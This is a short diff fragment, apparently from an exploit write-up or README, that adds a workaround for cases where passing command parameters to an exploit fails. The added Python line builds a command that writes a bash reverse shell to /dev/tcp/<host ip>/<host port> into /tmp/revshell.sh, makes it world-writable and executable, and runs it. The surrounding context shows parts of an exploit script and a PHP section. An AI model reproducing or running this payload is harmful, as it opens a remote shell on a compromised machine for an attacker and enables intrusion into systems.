@@ -118,6 +118,12 @@ except:
 sys.exit(0) 
 ```
 
+When using the exploit file to pass command parameters fails
+
+```Python
+command = "echo '/bin/bash -i >& /dev/tcp/<host ip>/<host port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh"
+```
+
 php(file)
 
 ```Php
